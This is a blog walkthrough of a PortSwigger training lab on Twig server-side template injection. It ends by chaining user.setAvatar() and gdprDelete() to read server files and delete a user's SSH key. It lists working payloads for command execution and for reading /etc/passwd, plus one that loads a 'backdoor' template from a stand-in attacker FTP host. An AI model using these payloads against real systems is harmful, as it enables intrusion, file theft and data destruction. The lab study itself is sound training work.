---
title: "Expert Lab: Server-side Template Injection with a Custom Exploit"
published: true
tags: [Web Application Security, Web Security Academy, Expert Labs, Server-Side Template Injection, SSTI, PHP, Twig]
description: "Lab Description: This lab is vulnerable to server-side template injection."
image: /blog/assets/2023/ssti-custom-exploit-twig.png
image_width: "256"
image_height: "256"
thumb_path: /blog/assets/2023/ssti-custom-exploit-twig-thumb.png
thumb_width: "130"
thumb_height: "130"
updated: 2025-10-13
toc: true
---

<br>
{% smart_image "{{ page.image }}" "{{ page.image_width }}" "{{ page.image_height }}" "{{ page.image_alt }}" eager high %}
[^1]
<br>

<!--TOC-->

<br>

## Lab Link
***
[Lab: Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

<br>

## Lab Description
* * *
<br>
This lab is vulnerable to server-side template injection[^2]. To solve the lab, create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
<br>
<br>
### **Warning**

As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.


<br>
## Solutions
* * *
<br>
### Solution 1: My Solution
This lab was pretty cool, I really enjoyed it, It took me a few days to solve this lab because at first I was going to the wrong direction reading all the stuff in Twig documentation[^3] which was unnecessary for this lab. Because in order to exploit most templating engines, you need to read the documentation and find important tips about security issues, warnings, plugins and extensions, FAQ, how to upload custom templates, developer section, how to create custom gadget chains, chaining suitable objects until we can get a useful method which leads to RCE or file read which could cause sensitive information disclosure... all of which can become pretty time-consuming. 

I tried to create custom Twig templates, Twig extensions and Twig filters and upload them to the server with the avatar image upload functionality and then run them where I had found template injection, I tried to create custom PHP files, and run them, none of these methods worked because Twig is already a quite hardened templating engine, so I realized I need another approach. 

I also pressed ChatGPT very hard asking all kinds of questions about Twig documentation and the syntax on how to create new Twig filters, extensions...

But the answer was simpler than I thought first, it just needed complete attention to the part of Web Security Academy before the lab[^4], actually the description there had the answer in it:

> Some template engines run in a secure, locked-down environment by default in order to mitigate the associated risks as much as possible. Although this makes it difficult to exploit such templates for remote code execution, `developer-created objects that are exposed to the template can offer a further, less battle-hardened attack surface`.

> However, while substantial documentation is usually provided for template built-ins, site-specific objects are almost certainly not documented at all. Therefore, working out how to exploit them will require you to investigate the website's behavior manually to identify the attack surface and construct your own custom exploit accordingly.

<br>
So we should search for developer-created objects, this is tip #1.

Ok, we run the lab, Open Burp Suite and proxy the traffic, log in as the `wiener` user, in the `account` page, there are two other tips:

{:start="2"}
2. We can choose the "Preferred name":

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig1.png 717 185 "" lazy "" webp async %}
<br>

 for example we can choose "First Name", check Burp and see the request `POST /my-account/change-blog-post-author-display` is sent and some part of body is: `blog-post-author-display=user.first_name`.

Also post a comment in one of the posts on the website and see that our account's first name, Peter, is shown as the comment post:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig2.png 767 449 "" lazy "" webp async %}
<br>

So our "Preferred name" is reflected in comment post section, we can test if this is vulnerable to template injection:

Send that previous `POST /my-account/change-blog-post-author-display` request to Burp repeater and change the `blog-post-author-display` in the message body like the following to test for temlpate injection:

{% raw %}
```
blog-post-author-display=user.first_name${{<%[%'"}}
```
{% endraw %}


And send the request, then refresh the post page that we had commented on, now this error is shown:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig3.png 1384 332 "Internal server error PHP fatal error multiple lines mentioning twig" lazy "" webp async %}
<br>

Which is quite useful. It shows we are dealing with Twig Template. We can now use some Twig syntax to see if there is template Injection:

{% raw %}
```
blog-post-author-display=user.first_name}}{{7*7
```
{% endraw %}

Then we can see, the result is reflected in our first name in the comments:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig4.png 727 442 "The result Peter49 is shown as the name in post comments" lazy "" webp async %}
<br>

So we have template injection, but can we exploit it? 

We search for some common Twig payloads and test them in the above section:

{% raw %}
```php
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
{% endraw %}

and see none of them actually work, so we still have a template injection that we may be able to use later, so let's move on:

{:start="3"}
3. We also see that we can upload our avatar image here:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig5.png 714 179 "" lazy "" webp async %}
<br>

First, we upload an actual image and check the request/response, no useful info is found, then let's see what happens if we don't select any file and click upload, as we can see we get an error:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig6.png 752 123 "PHP fatal error: error in file upload, /home/carlos/avatar_upload.php" lazy "" webp async %}
<br>

Let's play with this again, this time we try to see if we can upload a PHP file, then click upload, once again we get another error message:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig7.png 981 110 "PHP fatal error, uploaded file mime type is not an image" lazy "" webp async %}
<br>

This error is pretty useful, it shows two PHP files and also a `user.setAvatar()` method, so this `user` object that we also saw in tip #2 might be the developer-created object mentioned in our tip #1 and we might somehow be able to use its `setAvatar` method, let's test it in `POST /my-account/change-blog-post-author-display` first:

{% raw %}
```
blog-post-author-display=user.setAvatar()
```
{% endraw %}

Now send the request and refresh the post page we had commented on to see the result, We get this error:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig8.png 1224 300 "Internal Server Error, PHP fatal error: Too few arguments" lazy "" webp async %}
<br>

Very good! It shows this method can be used, now let's see if we can read those two PHP files found in the file upload errors, also notice in that image that `setAvatar()` method needs two arguments, first is the file path the second is MIME type, so first let's try `/home/carlos/User.php`:

{% raw %}
```
blog-post-author-display=user.setAvatar('/home/carlos/User.php','application/octet')
```
{% endraw %}

Send the request, refresh the post page, Now we get this error:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig9.png 1156 325 "Internal server error, PHP fatal error: uploaded file mime type is not an image" lazy "" webp async %}
<br>

Notice that it needs an image MIME type, so we change the payload like this:

{% raw %}
```
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')
```
{% endraw %}

Send this request, refresh the post page, now something interesting happens:

<br>
{% smart_image /blog/assets/2023/ssti-custom-exploit-twig10.png 743 109 "Broken image icon is shown instead of person name in comments section" lazy "" webp async %}
<br>

It seems our avatar image is successfully set to this PHP file, so we might be able to download and read this file. Now right click on this image and select "Open image in new tab" now the User.php file is downloaded:

```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

Do this same step to download avatar_upload.php, We are gathering as much info as we can now that may help us solve the lab:

{% raw %}
```
blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php','image/jpeg')
```
{% endraw %}

We get this:

```php
<?php

require_once("./User.php");

if ($_FILES['avatar']['error'] !== 0) {
    throw new Exception("Error in file upload: " . $_FILES['avatar']['error']);
}

if (strpos($_FILES['avatar']['name'], "/") !== false || strpos($_FILES['avatar']['name'], ".") === false) {
    throw new Exception("Uploaded file name is invalid: " . $_FILES['avatar']['name']);
}

$file = "/tmp/" . $_FILES['avatar']['name'];
if (!move_uploaded_file($_FILES['avatar']['tmp_name'], $file)) {
    throw new Exception("Could not move uploaded file '" . $_FILES['avatar']['tmp_name'] . "' to '" . $file . "'");
}

$user = new User($_POST['user'], null, null, null);
$user->setAvatar($file, $_FILES['avatar']['type']);
header('Location: ./');

?>
```

Now check the codes of these two files that are used in file upload functionality, we find an interesting public method: `gdprDelete()`, It is used to delete an avatar image and its symbolic link, so this might be our answer, first we set our avatar image as follows, with the file that should be deleted: 

{% raw %}
```
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpeg')
```
{% endraw %}

Then we send this request and refresh the post page we had commented, then check if this file is set as our avatar image, right click and open it, it contains:

```
Nothing to see here :)
```

So the file is set correctly as our avatar image, now we send the following payload using the function that we had found in User.php file, according to the code that we had downloaded, now this file and also the symbolic link that was made when `setAvatar()` function was called should be deleted, let's see:

{% raw %}
```
blog-post-author-display=user.gdprDelete()
```
{% endraw %}

We send this request and refresh the post page that we had commented on to execute the payload and booom! The `/home/carlos/.ssh/id_rsa` file is deleted and the lab is solved!

<br>
#### **Warning**

Be careful with `gdprDelete()` method, if it is called after:

{% raw %}
```
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpeg')
```
{% endraw %}

or this:

{% raw %}
```
blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php','image/jpeg')
```
{% endraw %}

These files are deleted from the server and since they have vital functionality for the server, we may inadvertently damage the server and may need to wait for 20 minutes for the lab server to reset.



<br>
### Solution 2:  Web Security Academy's Solution

1. While proxying traffic through Burp, log in and post a comment on one of the blogs.

2. Go to the "My account" page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, as we saw in a previous lab. You should also have noticed that you have access to the `user` object.

3. Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called `user.setAvatar()`. Also take note of the file path `/home/carlos/User.php`. You will need this later.

4. Upload a valid image as your avatar and load the page containing your test comment.

5. In Burp Repeater, open the `POST` request for changing your preferred name and use the `blog-post-author-display` parameter to set an arbitrary file as your avatar:

```php
user.setAvatar('/etc/passwd')
```

{:start="6"}
6. Load the page containing your test comment to render the template. Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template:

```php
user.setAvatar('/etc/passwd','image/jpg')
```

{:start="7"}
7. To read the file, load the avatar using `GET /avatar?avatar=wiener`. This will return the contents of the `/etc/passwd` file, confirming that you have access to arbitrary files.

8. Repeat this process to read the PHP file that you noted down earlier:

```php
user.setAvatar('/home/carlos/User.php','image/jpg')
```

{:start="9"}
9. In the PHP file, Notice that you have access to the `gdprDelete()` function, which deletes the user's avatar. You can combine this knowledge to delete Carlos's file.

10. First set the target file as your avatar, then view the comment to execute the template:

```php
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
```

{:start="11"}
11. Invoke the `user.gdprDelete()` method and view your comment again to solve the lab.


<br>
## _External Links_
* * *
* ### [Lab: Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

<br>
## _References_
* * *
[^1]: Icon made by [Freepik](https://www.flaticon.com/authors/freepik) from [www.flaticon.com](https://www.flaticon.com/)
[^2]: [Server-side template injection \| Web Security Academy](https://portswigger.net/web-security/server-side-template-injection)
[^3]: [Twig Documentation](https://twig.symfony.com/doc/)
[^4]: [Constructing a custom exploit using developer-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting#constructing-a-custom-exploit-using-developer-supplied-objects)
